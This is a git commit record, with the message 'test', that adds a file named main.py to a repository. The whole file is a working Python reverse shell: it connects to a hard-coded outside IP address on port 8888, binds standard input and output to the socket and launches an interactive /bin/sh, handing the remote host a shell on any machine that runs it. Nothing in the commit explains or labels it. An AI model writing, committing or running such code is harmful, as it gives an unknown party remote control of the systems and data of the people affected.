3f1bd42f9bacae8a08487550232774d3a3ffa54b
Tyler Bender <tyler@bitslip.io>
2019-04-17 09:15:11 -0700

    test

---
+++ main.py
@@ -0,0 +1,10 @@
+
+import socket,subprocess,os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("167.99.97.35",8888))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
